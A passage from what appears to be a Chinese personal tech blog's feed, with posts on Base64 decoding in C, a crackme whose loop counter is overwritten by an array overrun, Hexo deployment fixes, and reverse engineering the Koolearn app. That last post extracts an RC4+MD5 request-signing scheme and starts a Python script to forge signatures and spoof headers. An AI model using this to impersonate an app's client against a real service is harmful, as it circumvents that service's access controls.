id="B">B :</h6><p>我们观察 Q 的二进制：00010000，Q是由 B 的前六位二进制数转换而来的，而 B 的二进制数是：01000010<br>我们将 Q 的二进制数进行左移 2 位可以得到 01000000，我们发现与 B 的二进制数据还是有区别，此时我们再观察下一位 m 的二进制数据：00100110 ，这个时候我们如果将 m 右移4位那么不就可以得到我们想要的 00000010，再将其与01000000 进行或运算那不就得到第一个字符 B 了吗。</p><h6 id="a">a :</h6><p>我们还是一样的观察 m 的二进制：00100110，m 是由 B 的后 2 位二进制数加上 a 的前 4 位组成的，我们观察 a 的二进制数：01100001 和 F 的二进制数：00000101 可以看到我们将 m 的二进制数左移 4 位可以得到 01100000，此时我们再将 F右移两位可以得到：00000001，这个时候我们将这两个数进行或运算便可以得到我们想要的 a 的二进制数了。</p><h6 id="s：">s：</h6><p>s是 3 个为一组的字符里面的最后一个，s将组成 F 、z，那么我们解密 Fz 之前，我们还是先来观察一下 z 的二进制：00110011， s 的二进制：01110011，F 的二进制数：00000101，如果你仔细观察，那么你会发现我们将 F 左移 6 位后在与 z 进行与运算便是 s 的二进制了。</p><h6 id="a、W、M、-：">a、W、M、=：</h6><p>解密类似于 <code>QmFz</code> 就不再过多叙述了，最后我们会遇到 = ，此时我们不需要管 = ，将我们所有解密后的字符组合成一个字符串那么我们便得到了明文。</p></blockquote><h4 id="此时我们便完成了对应数据的解密过程，那么在代码上是如何实现的呢？">此时我们便完成了对应数据的解密过程，那么在代码上是如何实现的呢？</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *<span class="hljs-title">base64_decode</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *code)</span>  </span><br><span class="hljs-function"></span>&#123;  <br><span class="hljs-comment">//根据base64表，以字符找到对应的十进制数据  </span><br>    <span class="hljs-keyword">int</span> table[]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>     <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>     <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>     <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">62</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>     <span class="hljs-number">63</span>,<span class="hljs-number">52</span>,<span class="hljs-number">53</span>,<span class="hljs-number">54</span>,<span class="hljs-number">55</span>,<span class="hljs-number">56</span>,<span class="hljs-number">57</span>,<span class="hljs-number">58</span>,<br>     <span class="hljs-number">59</span>,<span class="hljs-number">60</span>,<span class="hljs-number">61</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>     <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<br>     <span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<br>     <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>,<br>     <span class="hljs-number">27</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">33</span>,<span class="hljs-number">34</span>,<span class="hljs-number">35</span>,<br>     <span class="hljs-number">36</span>,<span class="hljs-number">37</span>,<span class="hljs-number">38</span>,<span class="hljs-number">39</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>,<span class="hljs-number">42</span>,<span class="hljs-number">43</span>,<span class="hljs-number">44</span>,<br>     <span class="hljs-number">45</span>,<span class="hljs-number">46</span>,<span class="hljs-number">47</span>,<span class="hljs-number">48</span>,<span class="hljs-number">49</span>,<span class="hljs-number">50</span>,<span class="hljs-number">51</span><br>           &#125;;  <br>    <span class="hljs-keyword">long</span> len;  <br>    <span class="hljs-keyword">long</span> str_len;  <br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *res;  <br>    <span class="hljs-keyword">int</span> i,j;  <br>  <br><span class="hljs-comment">//计算解码后的字符串长度  </span><br>    len=<span class="hljs-built_in">strlen</span>(code);  <br><span class="hljs-comment">//判断编码后的字符串后是否有=  </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(code,<span class="hljs-string">&quot;==&quot;</span>))  <br>        str_len=len/<span class="hljs-number">4</span>*<span class="hljs-number">3</span><span class="hljs-number">-2</span>;  <br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(code,<span class="hljs-string">&quot;=&quot;</span>))  <br>        str_len=len/<span class="hljs-number">4</span>*<span class="hljs-number">3</span><span class="hljs-number">-1</span>;  <br>    <span class="hljs-keyword">else</span>  <br>        str_len=len/<span class="hljs-number">4</span>*<span class="hljs-number">3</span>;  <br>  <br>    res=<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)*str_len+<span class="hljs-number">1</span>);  <br>    res[str_len]=<span class="hljs-string">&#x27;\0&#x27;</span>;  <br>  <br><span class="hljs-comment">//以4个字符为一位进行解码  </span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>,j=<span class="hljs-number">0</span>;i &lt; len<span class="hljs-number">-2</span>;j+=<span class="hljs-number">3</span>,i+=<span class="hljs-number">4</span>)  <br>    &#123;  <br>        res[j]=((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)table[code[i]])&lt;&lt;<span class="hljs-number">2</span> | (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)table[code[i+<span class="hljs-number">1</span>]])&gt;&gt;<span class="hljs-number">4</span>); <span class="hljs-comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  </span><br>        res[j+<span class="hljs-number">1</span>]=(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)table[code[i+<span class="hljs-number">1</span>]])&lt;&lt;<span class="hljs-number">4</span>) | (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)table[code[i+<span class="hljs-number">2</span>]])&gt;&gt;<span class="hljs-number">2</span>); <span class="hljs-comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  </span><br>        res[j+<span class="hljs-number">2</span>]=(((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)table[code[i+<span class="hljs-number">2</span>]])&lt;&lt;<span class="hljs-number">6</span>) | ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)table[code[i+<span class="hljs-number">3</span>]]); <span class="hljs-comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  </span><br>    &#125;  <br>  <br>    <span class="hljs-keyword">return</span> res;  <br>  <br>&#125;  <br> <br></code></pre></td></tr></table></figure><h2 id="参考资料">参考资料</h2><p>C语言实现Base64编码/解码_开挂的熊猫-CSDN博客(<a href="https://blog.csdn.net/qq_26093511/article/details/78836087">https://blog.csdn.net/qq_26093511/article/details/78836087</a>)</p><p>Base64编码 - 简书 (<a href="https://www.jianshu.com/p/e95278ed98b4">https://www.jianshu.com/p/e95278ed98b4</a>)</p>]]></content>
    
    
    <categories>
      
      <category>Crypto</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Funny.exe分析</title>
    <link href="/2022/03/14/Funny.exe/"/>
    <url>/2022/03/14/Funny.exe/</url>
    
    <content type="html"><![CDATA[<h2 id="样本分析">样本分析</h2><h3 id="初步过程">初步过程</h3><p>~~（拿到程序，就被Windows Defender给杀了）~~我们运行一下程序会发现其在一直输出<code>Hello word</code>，我们先过一遍 <code>ExeinfoPe.exe</code>发现这个是一个32位的程序</p><p><img src="https://static01.imgkr.com/temp/5742367adf1a405fb5b8120899cc5502.png" alt=""></p><p>将其再拖入我们的~~【好朋友】~~ IDA里面进行反汇编的分析</p><p>打开一看，就仅有 2 个函数</p><p><img src="https://static01.imgkr.com/temp/69600aab44dd4aaba4f022087ab9a4d1.png" alt=""></p><h3 id="Fun-分析">Fun() 分析</h3><p>点开 fun 函数，我们可以看到内部的构造也是十分的简单</p><p><img src="https://static01.imgkr.com/temp/a333c0d8efaf4700ba0eff78fac94cd7.png" alt=""></p><p>也就仅仅一个循环，一个数组，在循环的过程中将<code>arr[i]</code>的值赋值为 0，输出一句 <code>Hello word</code>不过要注意的是这个<code>i</code>可以到达 7 而数组<code>arr[i]</code>最多也就只有<code>arr[5]</code>我们怀疑可能是越界而导致栈溢出的一直循环输出</p><h3 id="main-分析">_main()分析</h3><p>打开<code>_main()</code>函数同样也是十分的 “ 简略 ” 可以看到组成的部分函数还是一样的少：</p><p><img src="https://static01.imgkr.com/temp/93ab6ce1e2cc4739b64879350781f86a.png" alt=""></p><p>我们再对里面的各个函数进行分析，我们先判断<code>_initialized</code>的值在最开始是否为 0 ，而进而执行下面的函数转入汇编层打上对应的断点进行判断。</p><p><img src="https://static01.imgkr.com/temp/2fff2f0bf242433baf0a6a67a8be7790.png" alt=""></p><p>我们启动调试</p><p><img src="https://static01.imgkr.com/temp/ec8792747a774cbb8baa1a5b2c51ea82.png" alt=""></p><p>可以的看到在开始前<code>_initialized</code>的值是 0，那么在 if 语句中就会在非的转化下变为真，而执行后面的的<code>__do_global_ctors()</code></p><h4 id="do-global-ctors">__do_global_ctors()</h4><p>里面构造了一个指针 i ，并对其分配相应的地址值，在 fun 的函数中被调用，同时在里面也创建了一个一个初始化函数的列表，称为 <code>__CTOR_LIST__</code>,和一个终止函数列表，称为 <code>__DTOR_LIST__</code>,这个函数可以说是为 i 的生成创建了空间，同时也为下面的死循环埋下了伏笔。</p><h2 id="分析循环为什么一直不停">分析循环为什么一直不停</h2><h3 id="栈的理解">栈的理解</h3><p>我们一般来说程序的数据是存储在一个栈上面的，可栈又是什么东西呢？</p><blockquote><p>栈作为一种数据结构，是一种只能在一端进行插入和删除操作的特殊线性表。它按照后进先出的原则存储数据，先进入的数据被压入栈底，最后的数据在栈顶，需要读数据的时候从栈顶开始弹出数据（最后一个数据被第一个读出来）。栈具有记忆作用，对栈的插入与删除操作中，不需要改变栈底指针)。</p></blockquote><blockquote><p>栈是允许在同一端进行插入和删除操作的特殊线性表。允许进行插入和删除操作的一端称为栈顶(top)，另一端为栈底(bottom)；栈底固定，而栈顶浮动；栈中元素个数为零时称为空栈。插入一般称为进栈（PUSH），删除则称为退栈（POP）。栈也称为先进后出表。</p></blockquote><p>这里贴一张图：</p><p><img src="https://bkimg.cdn.bcebos.com/pic/a686c9177f3e67098c4504c03fc79f3df8dc5543?x-bce-process=image/watermark,image_d2F0ZXIvYmFpa2U5Mg==,g_7,xp_5,yp_5/format,f_auto" alt=""></p><p>我们可以把这个栈简单的理解为一个收纳的箱子（盒子），我们把一件件的衣服放入这个箱子里面，如果我们想要去取出最后一件衣服的话是不是需要拿走上面堆着的衣服？拿走衣服的过程我们就可以理解为出栈，而放入衣服的和过程则就是入栈啦。</p><p>简单的理解了栈后，可这个栈上面存储的数据与我们的死循环又有什么关系？</p><p>我们模仿<code>fun()</code>同样写一个程序,如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> arr[<span class="hljs-number">6</span>];<br><span class="hljs-keyword">int</span> i;<br>arr[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>arr[<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>arr[<span class="hljs-number">2</span>]=<span class="hljs-number">2</span>;<br>arr[<span class="hljs-number">3</span>]=<span class="hljs-number">3</span>;<br>arr[<span class="hljs-number">4</span>]=<span class="hljs-number">4</span>;<br>arr[<span class="hljs-number">5</span>]=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">7</span>;i++)&#123;<br>arr[i]=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以试着拿去运行一下下呢？</p><p>你会发现这个就是和那个程序一样陷入了死循环里，回到我们刚刚讲到的栈，这个时候我们会提到一个新的名字栈溢出，听名字我们便可以知道溢出，肯定是箱子装不下了（回到之前装衣服的例子），但是这个多出来的衣服会到哪里去呢？</p><p>我们之前不是分析到了有一个<code>__do_global_ctors()</code>函数，我们在里面发现了有一个指针 i ，这个 i 是也有一个自己的 ”箱子“ 的，我们多出来的衣服可能就会被放到 i 的 ”箱子“ 里面去。我们画一个图来看看 ：</p><p><img src="https://static01.imgkr.com/temp/12621dd711d046a9af044aace3607794.png" alt=""></p><p>简单的画一个图我们可以发现，<code>arr[i]</code>会在越界的时候占用掉 i 的箱子而改变 i 的值，也就是我们之前的那一个程序中的 ：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">7</span>;i++)&#123;<br>arr[i]=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>arr[i]</code>在重新赋值为 0 的过程中因为越界了会让我们的 i 没有地方放自己的东西了而被迫改变成<code>arr[i]</code>的数值~~（ 多 坏 啊 ~ ）~~</p><h3 id="IDA分析">IDA分析</h3><p>我们回到 IDA 里看看是不是发生了这个过程，我们到输出的部分的汇编层看看呢 ：</p><p><img src="https://static01.imgkr.com/temp/981d21e55c374735b1bdc9b4aeee435b.png" alt=""></p><p>我们在这个地方对程序进行对应的调试，简单重复for里面的看看便会发现 i 的值每次在越界之后又会 ”神奇“ 的再次回到 0 ，我们不免想起之前的赋值 <code>arr[i]=0</code>这个过程，同时也可以猜测出死循环的原因了，<code>arr[i]</code>在循环过程中发生了越界而占用了 i 的栈空间使得 i 的值被 <code>arr</code>所替代，而回归到 0 ，而继续循环。<s>回 到 梦 开 始 的 地 方</s></p><p><img src="https://static01.imgkr.com/temp/a7f518ddc12e4a3886975d002fe55476.png" alt=""></p><p>至此程序的原理就分析完啦。我们也可以发现题目的问题，了解到了 <code>arr[i]</code>在溢出后的栈而改变了 i ，所以~~<code>arr[i]</code>是真的坏！~~栈溢出是一个非常严重的问题。</p>]]></content>
    
    
    <categories>
      
      <category>Reverse Practice</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo错误：spawn failed的解决方法</title>
    <link href="/2022/03/14/Hexo%E9%94%99%E8%AF%AF%EF%BC%9Aspawn%20failed%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <url>/2022/03/14/Hexo%E9%94%99%E8%AF%AF%EF%BC%9Aspawn%20failed%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="重启电脑">重启电脑</h2><p>有的时候可能是因为网络波动产生的错误，请首先尝试。</p><h2 id="服务器相关">服务器相关</h2><p>如果你的Hexo是部署在服务器时，请注意以下方法</p><p>首先检查服务器是否能被ssh跑通，SERVER填写自己的云主机ip，以git用户为例：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">SHELL<br>ssh -v <span class="hljs-symbol">git@</span>SERVER<br></code></pre></td></tr></table></figure><h2 id="服务器部署">服务器部署</h2><p>请一定要检查公钥pub文件是否输入正确</p><p>切换至指定用户，以git用户为例：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">SHELL</span><br><span class="hljs-keyword">su</span> git<br><span class="hljs-keyword">mkdir</span> ~/.ssh<br>vim ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><p>将pub文件内容在i编辑模式下粘贴进去，请特别检查开头和结尾。</p><p>按<code>esc</code>后输入<code>:wq</code>退出</p><h2 id="服务器文件权限问题">服务器文件权限问题</h2><p>如果你部署的账户没有文件夹权限，则可能会出现权限问题，以git用户为例</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">SHELL<br>chown -R git:git <span class="hljs-regexp">/var/</span>repo/<br>chown -R git:git <span class="hljs-regexp">/var/</span>hexo/<br></code></pre></td></tr></table></figure><h2 id="使用Github部署">使用Github部署</h2><p>如果使用GitHub，可以尝试是否能跑通GitHub</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">SHELL<br>ssh -T <span class="hljs-symbol">git@</span>github.com<br></code></pre></td></tr></table></figure><h2 id="修改配置文件">修改配置文件</h2><p>打开_config.yml配置文件</p><p>修改以下内容</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dts">CODE<br><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">repo:</span> https:<span class="hljs-comment">//github.com/yourname/yourname.github.io.git</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">branch:</span> master<br></code></pre></td></tr></table></figure><p>其中的repo修改为</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">CODE<br>repo: git@github<span class="hljs-selector-class">.com</span>:yourname/yourname<span class="hljs-selector-class">.github</span><span class="hljs-selector-class">.io</span>.git<br></code></pre></td></tr></table></figure><h2 id="本地文件产生的问题">本地文件产生的问题</h2><p>如果你是本地文件产生错误，可以考虑以下方式。</p><h3 id="重置git的deploy文件夹">重置git的deploy文件夹</h3><p>删除博客文件夹中的<code>.deploy_git</code>文件夹，然后在终端cd这个文件夹后输入<code>git config --global core.autocrlf false</code></p><h3 id="删除lock文件">删除lock文件</h3><p>找到<code>.deploy_git</code>文件夹中的<code>index.lock</code>文件，删除就好了。</p><h3 id="强制推送（不推荐）">强制推送（不推荐）</h3><p>cd进<code>.deploy_git</code>文件夹，然后使用<code>git push -f</code>强制推送</p><h3 id="回滚版本">回滚版本</h3><p>打开<code>.deploy_git\.git\logs</code>路径下的<code>HEAD</code>查看最近一次正确的那次的<code>commitId</code>然后用<code>git reset --hard commitId</code>回滚</p><h2 id="大功告成！">大功告成！</h2><p>然后可以直接<code>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code>，发现就可以部署上了。</p>]]></content>
    
    
    <categories>
      
      <category>Others</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Koolearn逆向分析</title>
    <link href="/2022/03/14/Koolearn%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/2022/03/14/Koolearn%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="BY-混入21de蒟蒻">BY 混入21de蒟蒻</h2><h2 id="抓包分析过程"><strong>抓包分析过程</strong></h2><p>抓包之路太难了…实验室的网络时有时无，电脑手机都链接不了热点，无奈之下只好开始霍霍室友的安卓手机~~（没有安卓手机难受）~~</p><p>下载好<code>Packet Capture</code>，开始对应的抓包活动，可以抓到如下数据 ：</p><p><img src="https://obohe.com/i/2021/11/23/123xbdt.png" alt=""></p><p><img src="https://obohe.com/i/2021/11/23/123xas6.png" alt=""></p><p><img src="https://obohe.com/i/2021/11/23/123x753.png" alt=""></p><p>在包中我们可以看到请求的相关信息，设备型号，请求方式等。同时我们多次抓包分析可以看到红色框框的地方可能就是对应的签名，每次的长度固定 32 位。</p><p>而签名的生成便是要逆向分析了。</p><h2 id="逆向分析签名生成"><strong>逆向分析签名生成</strong></h2><h3 id="Jeb"><strong>Jeb</strong></h3><p>首先按照<code>PDF</code>上的教程开始利用<code>Jeb</code>来逆向安卓软件，利用字符串进行定位分析找到对应的<code>validation</code>。</p><p><img src="https://obohe.com/i/2021/11/23/123x04q.png" alt=""></p><p>找到后进行转换伪代码，如下图所示 ：</p><p><img src="https://obohe.com/i/2021/11/23/123x9ne.png" alt=""></p><p>我们根据<code>PDF</code>中的提示继续进行分析，通过<code>PDF</code>的提示我们知道<code>validation</code> 的值是由 <code>generateSign</code> 这个⽅法⽣成的。</p><p><img src="https://obohe.com/i/2021/11/23/123x8we.png" alt=""></p><p>双击该⽅法我们可以跳转到该⽅法的实现，再次根据<code>PDF</code>的提示我们可以知道该⽅法被修饰成了 native，该⽅法的具体实现在某个 <code>SO</code> ⽂件⾥⾯，那么我们的重点工作便是逆向分析这个<code>SO</code>文件。然而定义的<code>native</code>和 <code>so</code>在一个类里，通过此方式我们定位对应的<code>SO</code>文件，打开我们逆向<code>SO</code>的新大门。</p><p><img src="https://obohe.com/i/2021/11/23/123x8y4.png" alt=""></p><p>找到对应的<code>SO</code>后我们拖入<code>IDA</code>分析。</p><h3 id="IDA"><strong>IDA</strong></h3><p>进入<code>SO</code>后我们直接搜索<code>generateSign</code>，在里面我们可以看到有一个注册的函数进入分析</p><p><img src="https://obohe.com/i/2021/11/23/123xaqg.png" alt=""></p><p>进入后往下找可以看到有一个<code>MD5</code>加密，这个也就解释了为什么每次我们在获取到<code>validation</code>时其长度永远都是 32 位的。</p><p><img src="https://obohe.com/i/2021/11/23/12pxprp.png" alt=""></p><p>我们同时看到<code>MD5</code>加密的函数没有去符号表，猜测如果有其他加密那么是不是也会有对对应的符号表，按着这个思路我们继续分析，打开函数列表往下滑了滑就可以明显的看到还有一个<code>RC4</code>加密算法，通过交叉引用可以定位到如下界面，其中的加密过程便是<code>RC4 + MD5</code>，我们通过动调进行分析，测试我们输入的数据在这个加密后得到的数据与抓包得到的数据进行比对，我们可以发现出现对应<code>validation</code>的地方。</p><p><img src="https://obohe.com/i/2021/11/23/123xa6m.png" alt=""></p><p>进入<code>RC4</code>部分可以明显的看到其生成的过程，先初始化 256 的一个<code>BOX</code>密钥流，再对其进行异或加密，对此我们可以仿照其对应的生成相同的密钥流，或者直接提取出来对应的<code>BOX</code>的值之后对输入数据进行处理。</p><p>那么剩下的就是一个<code>MD5</code>加密了，对于哈希加密我们只能爆破进行求解，但是我们不需要爆破出来所对应的数据，可以通过抓包软件来完成得到数据。因此我们直接利用<code>Python</code>的哈希库实现同样操作即可。</p><p><img src="https://obohe.com/i/2021/11/23/12yqfqs.png" alt=""></p><h2 id="脚本编写"><strong>脚本编写</strong></h2><p><code>python</code>集成了一个<code>requests</code>库给我们使用，我们可以利用这个库来完成对服务器的请求（小爬虫）</p><p>在开始前我们同样的要获取相应的<code>Header</code>让服务器认为我们是用户而不是爬虫，来提供对应的服务。（UA伪装？爬虫还没有学多少）</p><p>同时还有一个<code>Url</code>给我们的爬虫进行爬取，一个<code>Data</code>提供爬取数据，之后便是对于服务器端的请求了。</p><h3 id="validation-生成：">**validation ** 生成：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generateSign</span>(<span class="hljs-params">sign,xlen</span>):</span><br>box = [<span class="hljs-number">0x75</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xAB</span>,<br><span class="hljs-number">0x19</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF8</span>,<br><span class="hljs-number">0x79</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xB6</span>, <span 